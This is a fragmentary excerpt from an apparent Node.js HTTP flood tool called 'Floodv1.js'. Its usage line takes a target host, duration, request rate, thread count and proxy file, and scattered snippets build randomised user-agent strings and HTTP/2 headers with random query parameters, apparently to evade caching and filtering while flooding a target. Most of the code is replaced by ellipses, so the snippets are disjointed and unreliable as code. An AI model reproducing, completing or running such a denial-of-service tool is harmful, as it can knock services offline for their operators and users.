...
const secureOptions = 
 ...
 if (process.argv.length < 7){console.log(`Usage: Floodv1.js host time req thread proxy.txt`); process.exit();}
...
const randstrsValue = randstrs(10);
 ...
 return randomStringArray.join('');
    ...
    const operatingSystems = ["Windows NT 12.0", "Macintosh", "X11"];
	const architectures = {
	  "Windows NT 12.0": "Win64; x64; rv:109.0",
	...
	const uas = `/5.0 (${randomOS};${randomArch}) ${randomxv} ${randomBrowser}`;
...
let headers = {
  ...
  ":scheme": "https",
  ":path": parsedTarget.path + "?" + randstr(3) + "=" +generateRandomString(3,6),
  ":method": "GET",
